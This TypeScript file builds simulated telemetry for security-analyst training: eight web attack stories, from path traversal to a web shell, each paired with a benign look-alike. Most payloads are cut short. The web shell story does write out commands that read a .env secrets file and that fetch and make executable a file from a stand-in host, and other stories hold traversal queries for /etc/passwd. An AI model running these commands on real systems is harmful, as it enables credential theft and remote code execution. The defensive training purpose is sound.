/**
 * Web application attack stories, part 1: foundation and core (Team Training only).
 *
 * Each story reads across a WAF, the origin web server and at least one more source, ends in
 * something the analyst must scope, and carries a benign look-alike in the same shape: the same
 * rule fired by a scanner, a pen test, a partner job, a broken client. The WAF and access log rows
 * are vendor-neutral (emitters/web.ts): the session's stack prints them as AWS WAF or Azure WAF, and
 * as nginx or IIS. A story that shows the server's own processes binds its access log to that server.
 *
 * A web server's name stays dotted: it is a named service of the estate, kept on every company
 * (its domain follows the company). URLs and parameters are abbreviated and inert.
 */
import type { TelemetryEvent } from "@/lib/sim/types";
import { serviceNowRecord } from "@/lib/sim/emitters/servicenow";
import { panWeb } from "@/lib/sim/emitters/paloalto";
import { csFile, csNetwork, csProcess } from "@/lib/sim/emitters/crowdstrike";
import { wafRequest, webAccess, type WebSite } from "@/lib/sim/emitters/web";
import { makeSha256 } from "@/lib/sim/iocs";

export interface WebStoryDef {
  id: string;
  title: string;
  complexity: "foundation" | "core" | "advanced";
  events: TelemetryEvent[];
}

const IA = "Initial Access", COLLECT = "Collection", CRED = "Credential Access", EXEC = "Execution", PERSIST = "Persistence", C2 = "Command and Control", IMPACT = "Impact", STEALTH = "Stealth";

/** Minutes after a story's start, as an ISO time. */
export const clock = (iso: string) => { const b = Date.parse(iso); return (min: number) => new Date(b + min * 60_000).toISOString(); };
/** Context row: the approved change or request behind a look-alike. */
export const ticket = (o: Parameters<typeof serviceNowRecord>[0]): TelemetryEvent => ({ ...serviceNowRecord(o), is_baseline: true });

const CHROME = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36";
const SCANNER = "Mozilla/5.0 (compatible; ASV-Scanner/9.6; +https://scanner.example/about)";
const PY = "python-requests/2.31.0";

// ══════════════════════════════════════════════════════════════════════════════
// 1. Path traversal to configuration files: foundation. One site, one client.
// ══════════════════════════════════════════════════════════════════════════════
function pathTraversal(): TelemetryEvent[] {
  const T = clock("2026-09-08T08:00:00Z");
  const w: WebSite = { site: "portal.nexacorp.com", host: "web-portal-01.nexacorp.com", ip: "10.20.40.21" };
  const atk = "203.0.113.41", scan = "198.51.100.200", ua = PY;
  const f = "/download";
  return [
    ticket({ id: "web_pt_001", ts: T(0), table: "change_request", number: "CHG0044120", state: "Implement", severity: "informational",
      shortDescription: "External ASV vulnerability scan of public sites, source 198.51.100.200, 08:00 to 12:00 UTC", description: "ServiceNow change CHG0044120 (Implement): external vulnerability scan of public sites" }),
    webAccess(w, { id: "web_pt_002", ts: T(4), srcIp: "198.51.100.12", path: f, query: "file=brochure-2026.pdf", bytes: 812344, ua: CHROME, isBaseline: true, description: "Customer downloaded a document from the portal" }),
    wafRequest(w, { id: "web_pt_003", ts: T(9), srcIp: scan, path: f, query: "file=..%2F..%2F...%2Fetc%2Fpasswd", action: "block", rule: "lfi_query", matched: "../", location: "ARGS:file", ua: SCANNER, severity: "medium", verdict: "fp",
      fpExplanation: "The approved external scan under CHG0044120: its source address, its user agent and its window all match the change, and it never got past the block.", description: "WAF rule matched a path sequence in the file parameter of /download" }),
    wafRequest(w, { id: "web_pt_004", ts: T(62), srcIp: atk, path: f, query: "file=..%2F..%2F...%2Fetc%2Fpasswd", action: "block", rule: "lfi_query", matched: "../", location: "ARGS:file", ua, severity: "medium", isDetection: true, mitre: "T1190", tactic: IA, description: "WAF rule matched a path sequence in the file parameter of /download" }),
    wafRequest(w, { id: "web_pt_005", ts: T(62.5), srcIp: atk, path: f, query: "file=%2e%2e%2f%2e%2e%2f...%2fetc%2fpasswd", action: "block", rule: "lfi_query", matched: "../", location: "ARGS:file", ua, severity: "medium", mitre: "T1190", tactic: IA, description: "WAF rule matched a path sequence in the file parameter of /download" }),
    wafRequest(w, { id: "web_pt_006", ts: T(64), srcIp: atk, path: f, query: "file=....%2F%2F....%2F%2F...%2F.env", action: "allow", ua, bytes: 3122, description: "WAF passed a request to /download" }),
    webAccess(w, { id: "web_pt_007", ts: T(64.1), srcIp: atk, path: f, query: "file=....%2F%2F....%2F%2F...%2F.env", bytes: 3122, ua, mitre: "T1552.001", tactic: CRED, severity: "low", description: "Web server answered a request to /download" }),
    webAccess(w, { id: "web_pt_008", ts: T(65), srcIp: atk, path: f, query: "file=....%2F%2F....%2F%2F...%2Fconfig%2Fdatabase.yml", bytes: 2048, ua, mitre: "T1552.001", tactic: CRED, severity: "low", description: "Web server answered a request to /download" }),
    webAccess(w, { id: "web_pt_009", ts: T(67), srcIp: atk, path: f, query: "file=....%2F%2F....%2F%2F...%2Fbackup%2Fportal-db.sql.gz", bytes: 48211933, ua, mitre: "T1005", tactic: COLLECT, severity: "medium", description: "Web server answered a request to /download" }),
  ];
}

// ══════════════════════════════════════════════════════════════════════════════
// 2. Broken object level authorization on an API: foundation. One token, one API.
// ══════════════════════════════════════════════════════════════════════════════
function objectWalk(): TelemetryEvent[] {
  const T = clock("2026-09-09T13:00:00Z");
  const w: WebSite = { site: "api.nexacorp.com", host: "web-api-01.nexacorp.com", ip: "10.20.40.31" };
  const atk = "203.0.113.90", partner = "198.51.100.140", ua = "okhttp/4.12.0", rule = "api-rate-per-ip";
  const statement = (id: string, n: number, min: number, bytes: number, extra = {}) =>
    webAccess(w, { id, ts: T(min), srcIp: atk, path: `/api/v2/customers/${n}/statements`, bytes, ua, description: "API answered a statements request", ...extra });
  return [
    ticket({ id: "web_bola_001", ts: T(0), table: "sc_req_item", number: "RITM0051877", state: "Closed Complete", severity: "informational",
      shortDescription: "Partner reconciliation job, partner 2207, daily batch from 198.51.100.140", description: "ServiceNow request RITM0051877 (Closed Complete): partner reconciliation batch job" }),
    wafRequest(w, { id: "web_bola_002", ts: T(6), srcIp: partner, path: "/api/v2/partners/2207/statements", query: "page=12", action: "count", rule: "rate", ruleName: rule, rateLimit: 300, rateWindowSec: 300, ua: "PartnerSync/3.1", severity: "medium", verdict: "fp",
      fpExplanation: "The partner's approved reconciliation job (RITM0051877): it reads its own partner path with paging, from its registered address, and goes over the rate limit every day.", description: "Rate rule evaluated a client over its limit on the statements API" }),
    webAccess(w, { id: "web_bola_003", ts: T(41), srcIp: atk, method: "POST", path: "/api/v2/login", status: 200, bytes: 412, ua, description: "API answered a sign-in" }),
    statement("web_bola_004", 48213, 42, 18207),
    statement("web_bola_005", 48214, 42.1, 18442, { mitre: "T1190", tactic: IA }),
    statement("web_bola_006", 48215, 42.2, 17966, { mitre: "T1190", tactic: IA }),
    statement("web_bola_007", 48216, 42.3, 19011, { mitre: "T1119", tactic: COLLECT }),
    wafRequest(w, { id: "web_bola_008", ts: T(46), srcIp: atk, path: "/api/v2/customers/48244/statements", action: "count", rule: "rate", ruleName: rule, rateLimit: 300, rateWindowSec: 300, ua, severity: "medium", isDetection: true, mitre: "T1119", tactic: COLLECT, description: "Rate rule evaluated a client over its limit on the statements API" }),
    statement("web_bola_009", 48244, 46.1, 18119, { mitre: "T1119", tactic: COLLECT }),
    statement("web_bola_010", 49530, 58, 17803, { mitre: "T1119", tactic: COLLECT }),
    webAccess(w, { id: "web_bola_011", ts: T(58.2), srcIp: atk, path: "/api/v2/customers/49530/documents/id-scan.pdf", bytes: 2284113, ua, mitre: "T1119", tactic: COLLECT, severity: "medium", description: "API answered a document request" }),
  ];
}

// ══════════════════════════════════════════════════════════════════════════════
// 3. Credential stuffing against a customer login: core.
// ══════════════════════════════════════════════════════════════════════════════
function credentialStuffing(): TelemetryEvent[] {
  const T = clock("2026-09-10T19:00:00Z");
  const w: WebSite = { site: "portal.nexacorp.com", host: "web-portal-02.nexacorp.com", ip: "10.20.40.22" };
  const ua = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15";
  const app = "CustomerApp/5.1.9 (Android 14)", nat = "198.51.100.150", win = "198.51.100.61";
  const login = (id: string, min: number, ip: string, status: number, extra = {}) =>
    webAccess(w, { id, ts: T(min), srcIp: ip, method: "POST", path: "/account/login", status, bytes: status === 302 ? 0 : 391, ua, description: "Portal answered a sign-in", ...extra });
  return [
    ticket({ id: "web_cs_001", ts: T(0), table: "incident", number: "INC0091344", state: "In Progress", severity: "informational",
      shortDescription: "Mobile app 5.1.9 retries sign-in with an expired refresh token, fix in 5.2.0", description: "ServiceNow incident INC0091344 (In Progress): mobile app 5.1.9 sign-in retry defect" }),
    wafRequest(w, { id: "web_cs_002", ts: T(5), srcIp: nat, method: "POST", path: "/account/login", action: "block", rule: "login_volumetric", ua: app, severity: "medium", verdict: "fp",
      fpExplanation: "The known mobile app defect in INC0091344: one app version behind one carrier gateway, failing on an expired token, and no sign-in succeeds from it.", description: "Login traffic flagged for volume from one address" }),
    webAccess(w, { id: "web_cs_003", ts: T(5.2), srcIp: nat, method: "POST", path: "/account/login", status: 401, bytes: 391, ua: app, isBaseline: true, description: "Portal answered a sign-in" }),
    login("web_cs_004", 32, "203.0.113.60", 401, { mitre: "T1110.004", tactic: CRED }),
    login("web_cs_005", 32.2, "203.0.113.61", 401, { mitre: "T1110.004", tactic: CRED }),
    wafRequest(w, { id: "web_cs_006", ts: T(33), srcIp: "203.0.113.61", method: "POST", path: "/account/login", action: "block", rule: "login_volumetric", ua, severity: "medium", isDetection: true, mitre: "T1110.004", tactic: CRED, description: "Login traffic flagged for volume from one address" }),
    login("web_cs_007", 33.5, "203.0.113.62", 401, { mitre: "T1110.004", tactic: CRED }),
    wafRequest(w, { id: "web_cs_008", ts: T(34), srcIp: "203.0.113.62", method: "POST", path: "/account/login", action: "block", rule: "login_stolen", ua, severity: "high", isDetection: true, mitre: "T1110.004", tactic: CRED, description: "Login traffic flagged for repeated sign-in attempts" }),
    login("web_cs_009", 36, win, 302, { mitre: "T1078", tactic: IA }),
    webAccess(w, { id: "web_cs_010", ts: T(36.3), srcIp: win, path: "/account/profile", query: "cid=771204", bytes: 6120, ua, mitre: "T1078", tactic: IA, description: "Portal answered a profile request" }),
    webAccess(w, { id: "web_cs_011", ts: T(37), srcIp: win, method: "POST", path: "/account/profile/email", query: "cid=771204", bytes: 288, ua, mitre: "T1098", tactic: PERSIST, severity: "medium", description: "Portal answered a profile change" }),
    webAccess(w, { id: "web_cs_012", ts: T(38), srcIp: win, method: "POST", path: "/account/rewards/redeem", query: "cid=771204", bytes: 301, ua, mitre: "T1657", tactic: IMPACT, severity: "medium", description: "Portal answered a rewards redemption" }),
    login("web_cs_013", 41, win, 302, { mitre: "T1078", tactic: IA }),
    webAccess(w, { id: "web_cs_014", ts: T(41.4), srcIp: win, method: "POST", path: "/account/rewards/redeem", query: "cid=690377", bytes: 301, ua, mitre: "T1657", tactic: IMPACT, severity: "medium", description: "Portal answered a rewards redemption" }),
  ];
}

// ══════════════════════════════════════════════════════════════════════════════
// 4. Password reset poisoning: core. A staff account's reset link built on the client's Host.
// ══════════════════════════════════════════════════════════════════════════════
function resetPoisoning(): TelemetryEvent[] {
  const T = clock("2026-09-14T09:00:00Z");
  const w: WebSite = { site: "portal.nexacorp.com", host: "web-portal-03.nexacorp.com", ip: "10.20.40.23" };
  const atk = "203.0.113.101", evil = "reset-portal.example", ua = CHROME;
  const token = "7c1e49d2a0b64f3e", cust = "198.51.100.130", custUa = "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1";
  return [
    wafRequest(w, { id: "web_rp_000", ts: T(3), srcIp: cust, method: "POST", path: "/account/password/forgot", action: "count", rule: "custom", ruleName: "HostHeaderNotAllowlisted", matched: "portal.nexacorp.com:443", location: "REQUEST_HEADERS:Host", hostHeader: "portal.nexacorp.com:443", ua: custUa, severity: "medium", verdict: "fp",
      fpExplanation: "A customer's phone behind a carrier proxy that adds the port: the Host is the site's own name, and the reset link was used from the same address and device.", description: "Custom rule evaluated the Host header of a password reset request" }),
    webAccess(w, { id: "web_rp_001", ts: T(3), srcIp: cust, method: "POST", path: "/account/password/forgot", hostHeader: "portal.nexacorp.com:443", bytes: 512, ua: custUa, isBaseline: true, description: "Portal answered a password reset request" }),
    webAccess(w, { id: "web_rp_002", ts: T(5), srcIp: cust, path: "/account/reset", query: "token=2f90b7c1d3e84a6f", bytes: 3320, ua: custUa, isBaseline: true, description: "Portal answered a reset link" }),
    webAccess(w, { id: "web_rp_003", ts: T(5.5), srcIp: cust, method: "POST", path: "/account/reset", status: 302, bytes: 0, ua: custUa, isBaseline: true, description: "Portal answered a password change" }),
    wafRequest(w, { id: "web_rp_004", ts: T(38), srcIp: atk, method: "POST", path: "/account/password/forgot", action: "count", rule: "custom", ruleName: "HostHeaderNotAllowlisted", matched: evil, location: "REQUEST_HEADERS:Host", hostHeader: evil, ua, severity: "medium", isDetection: true, mitre: "T1190", tactic: IA, description: "Custom rule evaluated the Host header of a password reset request" }),
    webAccess(w, { id: "web_rp_005", ts: T(38.1), srcIp: atk, method: "POST", path: "/account/password/forgot", hostHeader: evil, bytes: 512, ua, mitre: "T1190", tactic: IA, description: "Portal answered a password reset request" }),
    panWeb({ id: "web_rp_006", ts: T(44), host: "WS-OPS-2214", user: "m.levi@nexacorp.com", srcIp: "10.10.20.14", url: `https://${evil}/account/reset?token=${token}`, domain: evil, dstIp: "203.0.113.102", category: "newly-registered-domain", action: "alert", userAgent: CHROME, severity: "medium", description: "User workstation requested a page on a newly registered domain" }),
    webAccess(w, { id: "web_rp_007", ts: T(46), srcIp: atk, path: "/account/reset", query: `token=${token}`, bytes: 3320, ua, mitre: "T1078", tactic: IA, description: "Portal answered a reset link" }),
    webAccess(w, { id: "web_rp_008", ts: T(46.5), srcIp: atk, method: "POST", path: "/account/reset", status: 302, bytes: 0, ua, mitre: "T1098", tactic: PERSIST, severity: "medium", description: "Portal answered a password change" }),
    webAccess(w, { id: "web_rp_009", ts: T(47), srcIp: atk, method: "POST", path: "/account/login", status: 302, bytes: 0, ua, mitre: "T1078", tactic: IA, description: "Portal answered a sign-in" }),
    webAccess(w, { id: "web_rp_010", ts: T(49), srcIp: atk, path: "/admin/customers/export", query: "format=csv", bytes: 31844207, ua, mitre: "T1005", tactic: COLLECT, severity: "medium", description: "Portal answered an admin export" }),
  ];
}

// ══════════════════════════════════════════════════════════════════════════════
// 5. Stored XSS to a support agent's session: core.
// ══════════════════════════════════════════════════════════════════════════════
function storedXss(): TelemetryEvent[] {
  const T = clock("2026-09-15T10:00:00Z");
  const w: WebSite = { site: "support.nexacorp.com", host: "web-support-01.nexacorp.com", ip: "10.20.40.41" };
  const atk = "203.0.113.112", agentIp = "10.10.20.19", collect = "img.helpdesk-cdn.example";
  const ua = "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0";
  return [
    wafRequest(w, { id: "web_xs_001", ts: T(7), srcIp: agentIp, method: "POST", path: "/admin/tickets/88190/reply", action: "count", rule: "xss_body", matched: "<table style=...", location: "ARGS:body", ua: CHROME, status: 201, severity: "medium", verdict: "fp",
      fpExplanation: "A support agent's reply from the office with the HTML signature of the ticket editor. This false match is why the rule is in Count on this site.", description: "WAF rule matched HTML in a ticket body" }),
    wafRequest(w, { id: "web_xs_002", ts: T(52), srcIp: atk, method: "POST", path: "/tickets", action: "count", rule: "xss_body", matched: "<svg on...", location: "ARGS:body", ua, status: 201, severity: "medium", isDetection: true, mitre: "T1059.007", tactic: EXEC, description: "WAF rule matched HTML in a ticket body" }),
    webAccess(w, { id: "web_xs_003", ts: T(52.1), srcIp: atk, method: "POST", path: "/tickets", status: 201, bytes: 744, sent: 2318, ua, mitre: "T1059.007", tactic: EXEC, description: "Support site answered a new ticket" }),
    webAccess(w, { id: "web_xs_004", ts: T(71), srcIp: agentIp, path: "/admin/tickets/88213", bytes: 22410, ua: CHROME, referer: "https://support.nexacorp.com/admin/tickets?status=open", isBaseline: true, description: "Support site answered a ticket view" }),
    panWeb({ id: "web_xs_005", ts: T(71.1), host: "WS-SALES-1876", user: "a.kaplan@nexacorp.com", srcIp: agentIp, url: `https://${collect}/p.gif?c=...`, domain: collect, dstIp: "203.0.113.113", category: "unknown", action: "alert", referer: "https://support.nexacorp.com/admin/tickets/88213", userAgent: CHROME, mitre: "T1539", tactic: CRED, severity: "medium", description: "User workstation requested an image from an uncategorized domain" }),
    webAccess(w, { id: "web_xs_006", ts: T(74), srcIp: atk, path: "/admin/tickets", query: "status=open", bytes: 18112, ua, mitre: "T1550.004", tactic: STEALTH, description: "Support site answered a ticket list" }),
    webAccess(w, { id: "web_xs_007", ts: T(76), srcIp: atk, path: "/admin/customers/search", query: "q=...", bytes: 40218, ua, mitre: "T1550.004", tactic: STEALTH, description: "Support site answered a customer search" }),
    webAccess(w, { id: "web_xs_008", ts: T(78), srcIp: atk, method: "POST", path: "/admin/users/invite", status: 201, bytes: 318, ua, mitre: "T1136", tactic: PERSIST, severity: "medium", description: "Support site answered a user invitation" }),
    webAccess(w, { id: "web_xs_009", ts: T(81), srcIp: atk, path: "/admin/tickets/export", query: "from=2026-06-01", bytes: 27330914, ua, mitre: "T1005", tactic: COLLECT, severity: "medium", description: "Support site answered a ticket export" }),
  ];
}

// ══════════════════════════════════════════════════════════════════════════════
// 6. Unrestricted file upload to a web shell: core. nginx + php-fpm on Linux.
// ══════════════════════════════════════════════════════════════════════════════
function uploadShell(): TelemetryEvent[] {
  const T = clock("2026-09-16T14:00:00Z");
  const w: WebSite = { site: "members.nexacorp.com", host: "web-members-01.nexacorp.com", ip: "10.20.40.51", server: "nginx" };
  const atk = "203.0.113.54", ua = PY, mirror = "dl.files-mirror.example", c2 = "198.51.100.71";
  const shell = "/uploads/avatars/7731/avatar.php";
  const root = "/var/www/members/public";
  const FPM = { parentName: "php-fpm8.2", parentPid: 21840 };
  const host = { host: w.host, user: null, srcIp: w.ip };
  const sh = (id: string, min: number, pid: number, cmd: string, extra = {}) => csProcess({ id, ts: T(min), ...host, processName: "dash", processPath: "/usr/bin/dash", cmdline: cmd, pid, ...FPM, runAsUser: "www-data",
    sha256: makeSha256("usr_bin_dash_debian_signed"), description: `Process started on ${w.host}`, ...extra });
  return [
    ticket({ id: "web_up_001", ts: T(0), table: "change_request", number: "CHG0044198", state: "Implement", severity: "informational",
      shortDescription: "Members site theme update, uploaded by web team from the office", description: "ServiceNow change CHG0044198 (Implement): members site theme update" }),
    wafRequest(w, { id: "web_up_002", ts: T(6), srcIp: "10.10.20.33", method: "POST", path: "/admin/theme/upload", action: "count", rule: "php_body", matched: "<?php ...", location: "REQUEST_BODY", ua: CHROME, severity: "medium", verdict: "fp",
      fpExplanation: "The web team's approved theme package under CHG0044198: it holds PHP templates by design, it comes from the office, and it goes through the admin path.", description: "WAF rule matched PHP code in an upload" }),
    wafRequest(w, { id: "web_up_003", ts: T(48), srcIp: atk, method: "POST", path: "/account/avatar", action: "count", rule: "php_body", matched: "<?php ...", location: "REQUEST_BODY", ua, sent: 4210, bytes: 288, severity: "medium", isDetection: true, mitre: "T1190", tactic: IA, description: "WAF rule matched PHP code in an upload" }),
    webAccess(w, { id: "web_up_004", ts: T(48.1), srcIp: atk, method: "POST", path: "/account/avatar", bytes: 288, sent: 4210, ua, mitre: "T1190", tactic: IA, description: "Members site answered an avatar upload" }),
    csFile({ id: "web_up_005", ts: T(48.1), ...host, path: `${root}${shell}`, size: 3896, actorProcess: "php-fpm8.2", actorPath: "/usr/sbin/php-fpm8.2", actorPid: 21902, runAsUser: "www-data", mitre: "T1505.003", tactic: PERSIST, severity: "medium", description: `File written under the web root on ${w.host}` }),
    webAccess(w, { id: "web_up_006", ts: T(49), srcIp: atk, path: shell, bytes: 43, ua, mitre: "T1505.003", tactic: PERSIST, description: "Members site answered a request in the uploads folder" }),
    sh("web_up_007", 49.1, 21977, "sh -c id", { isDetection: true, severity: "high", mitre: "T1059.004", tactic: EXEC }),
    sh("web_up_008", 51, 22014, `sh -c "cat /var/www/members/.env"`, { mitre: "T1552.001", tactic: CRED, severity: "medium" }),
    webAccess(w, { id: "web_up_009", ts: T(51), srcIp: atk, method: "POST", path: shell, bytes: 1902, sent: 512, ua, mitre: "T1505.003", tactic: PERSIST, description: "Members site answered a request in the uploads folder" }),
    sh("web_up_010", 53, 22061, `sh -c "curl -s https://${mirror}/k -o /tmp/.k && chmod +x /tmp/.k"`, { mitre: "T1105", tactic: C2, severity: "medium" }),
    panWeb({ id: "web_up_011", ts: T(53), host: w.host, user: null, srcIp: w.ip, url: `https://${mirror}/k`, domain: mirror, dstIp: "198.51.100.72", category: "unknown", action: "alert", userAgent: "curl/8.5.0", bytesIn: 2841200, severity: "medium", mitre: "T1105", tactic: C2, description: "Server downloaded a file from an uncategorized domain" }),
    csNetwork({ id: "web_up_012", ts: T(55), ...host, remoteIp: c2, remotePort: 443, processName: ".k", processPath: "/tmp/.k", cmdline: "/tmp/.k", pid: 22107, parentName: "dash", parentPid: 22061, mitre: "T1071.001", tactic: C2, severity: "medium", description: `Outbound connection from ${w.host}` }),
  ];
}

// ══════════════════════════════════════════════════════════════════════════════
// 7. GraphQL schema discovery and batched sign-in guessing: core.
// ══════════════════════════════════════════════════════════════════════════════
function graphqlBatch(): TelemetryEvent[] {
  const T = clock("2026-09-17T07:30:00Z");
  const w: WebSite = { site: "graph.nexacorp.com", host: "web-graph-01.nexacorp.com", ip: "10.20.40.61" };
  const atk = "203.0.113.151", ua = "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36";
  const app = "CustomerApp/5.2.0 (iOS 17.5)", nat = "198.51.100.152";
  const post = (id: string, min: number, sent: number, bytes: number, extra = {}) => webAccess(w, { id, ts: T(min), srcIp: atk, method: "POST", path: "/graphql", sent, bytes, ua, description: "GraphQL endpoint answered a request", ...extra });
  return [
    wafRequest(w, { id: "web_gq_001", ts: T(3), srcIp: nat, method: "POST", path: "/graphql", action: "count", rule: "size_body", ua: app, sent: 9214, bytes: 41022, severity: "low", verdict: "fp",
      fpExplanation: "The mobile app's home screen: a large query from a current app version, with a large response and no sign-in in it.", description: "WAF rule evaluated a large request body on the GraphQL endpoint" }),
    webAccess(w, { id: "web_gq_002", ts: T(3.1), srcIp: nat, method: "POST", path: "/graphql", sent: 9214, bytes: 41022, ua: app, isBaseline: true, description: "GraphQL endpoint answered a request" }),
    wafRequest(w, { id: "web_gq_003", ts: T(31), srcIp: atk, method: "POST", path: "/graphql", action: "block", rule: "custom", ruleName: "BlockGraphqlIntrospection", matched: "__schema", location: "REQUEST_BODY", ua, severity: "medium", isDetection: true, mitre: "T1595.002", tactic: "Reconnaissance", description: "Custom rule evaluated the body of a GraphQL request" }),
    post("web_gq_004", 33, 1188, 2204, { mitre: "T1595.002", tactic: "Reconnaissance" }),
    wafRequest(w, { id: "web_gq_005", ts: T(36), srcIp: atk, method: "POST", path: "/graphql", action: "count", rule: "size_body", ua, sent: 18774, bytes: 1204, severity: "low", mitre: "T1110.001", tactic: CRED, description: "WAF rule evaluated a large request body on the GraphQL endpoint" }),
    post("web_gq_006", 36, 18774, 1204, { mitre: "T1110.001", tactic: CRED }),
    post("web_gq_007", 36.4, 18802, 1204, { mitre: "T1110.001", tactic: CRED }),
    post("web_gq_008", 36.8, 18790, 1204, { mitre: "T1110.001", tactic: CRED }),
    post("web_gq_009", 37.2, 18781, 1661, { mitre: "T1110.001", tactic: CRED }),
    webAccess(w, { id: "web_gq_010", ts: T(38), srcIp: atk, path: "/account/orders", query: "cid=512088", bytes: 14420, ua, mitre: "T1078", tactic: IA, description: "Site answered an orders request" }),
    webAccess(w, { id: "web_gq_011", ts: T(39), srcIp: atk, method: "POST", path: "/account/payment-methods", query: "cid=512088", bytes: 322, ua, mitre: "T1657", tactic: IMPACT, severity: "medium", description: "Site answered a payment method change" }),
  ];
}

// ══════════════════════════════════════════════════════════════════════════════
// 8. WAF evasion after a block, SQL injection through: core.
// ══════════════════════════════════════════════════════════════════════════════
function wafEvasion(): TelemetryEvent[] {
  const T = clock("2026-09-21T12:00:00Z");
  const w: WebSite = { site: "shop.nexacorp.com", host: "web-shop-01.nexacorp.com", ip: "10.20.40.71" };
  const atk = "198.51.100.44", pen = "198.51.100.210", ua = PY, p = "/products";
  const blocked = (id: string, min: number, query: string, extra = {}) => wafRequest(w, { id, ts: T(min), srcIp: atk, path: p, query, action: "block", rule: "sqli_query", matched: "UNION SEL...", location: "ARGS:id", ua, severity: "medium", mitre: "T1190", tactic: IA, description: "WAF rule matched SQL syntax in the id parameter of /products", ...extra });
  const passed = (id: string, min: number, query: string, bytes: number, extra = {}) => webAccess(w, { id, ts: T(min), srcIp: atk, path: p, query, bytes, ua, mitre: "T1190", tactic: IA, description: "Shop answered a product request", ...extra });
  return [
    ticket({ id: "web_wf_001", ts: T(0), table: "change_request", number: "CHG0044263", state: "Implement", severity: "informational",
      shortDescription: "Annual web penetration test, source 198.51.100.210, this week", description: "ServiceNow change CHG0044263 (Implement): annual web penetration test" }),
    wafRequest(w, { id: "web_wf_002", ts: T(11), srcIp: pen, path: p, query: "id=12'+OR+...", action: "block", rule: "sqli_query", matched: "' OR ...", location: "ARGS:id", ua: "Mozilla/5.0 (compatible; PentestCo-Assessment/2026)", severity: "medium", verdict: "fp",
      fpExplanation: "The annual penetration test under CHG0044263: the source address and the tester's declared user agent match the change.", description: "WAF rule matched SQL syntax in the id parameter of /products" }),
    webAccess(w, { id: "web_wf_003", ts: T(21), srcIp: "198.51.100.15", path: p, query: "id=12", bytes: 8840, ua: CHROME, isBaseline: true, description: "Shop answered a product request" }),
    blocked("web_wf_004", 44, "id=12+UNION+SEL...", { isDetection: true }),
    blocked("web_wf_005", 44.4, "id=12%20UnIoN%20SeL..."),
    blocked("web_wf_006", 45, "id=12/**/UNION/**/SEL..."),
    wafRequest(w, { id: "web_wf_007", ts: T(47), srcIp: atk, path: p, query: "id=12+AND+JSON_...", action: "allow", ua, bytes: 8840, mitre: "T1027", tactic: STEALTH, description: "WAF passed a request to /products" }),
    passed("web_wf_008", 47, "id=12+AND+JSON_...", 8840, { mitre: "T1027", tactic: STEALTH }),
    passed("web_wf_009", 48, "id=12+AND+JSON_...+information_sch...", 21904),
    passed("web_wf_010", 51, "id=12+AND+JSON_...+customers...", 1940233, { mitre: "T1005", tactic: COLLECT, severity: "medium" }),
    wafRequest(w, { id: "web_wf_011", ts: T(53), srcIp: atk, path: p, query: "id=12+AND+JSON_...+customers+LIMIT...", action: "allow", ua, bytes: 6482112, mitre: "T1005", tactic: COLLECT, description: "WAF passed a request to /products" }),
    passed("web_wf_012", 53, "id=12+AND+JSON_...+customers+LIMIT...", 6482112, { mitre: "T1005", tactic: COLLECT, severity: "medium" }),
  ];
}

export const WEB_ENTRY_STORIES: WebStoryDef[] = [
  { id: "web-path-traversal-config", title: "Files Read Through the Portal Download Page", complexity: "foundation", events: pathTraversal() },
  { id: "web-bola-id-enumeration", title: "One Token Reading Other Customers' Statements", complexity: "foundation", events: objectWalk() },
  { id: "web-cred-stuffing-portal", title: "Sign-In Wave on the Customer Portal and Redeemed Rewards", complexity: "core", events: credentialStuffing() },
  { id: "web-reset-poisoning", title: "Staff Password Reset Link Sent Through the Wrong Host", complexity: "core", events: resetPoisoning() },
  { id: "web-stored-xss-session", title: "Support Agent Session Used From Outside", complexity: "core", events: storedXss() },
  { id: "web-upload-webshell", title: "Script Running From the Avatar Folder", complexity: "core", events: uploadShell() },
  { id: "web-graphql-batch", title: "Large GraphQL Requests and a Changed Payment Method", complexity: "core", events: graphqlBatch() },
  { id: "web-waf-evasion-sqli", title: "Blocked Client Gets Through to the Product Page", complexity: "core", events: wafEvasion() },
];
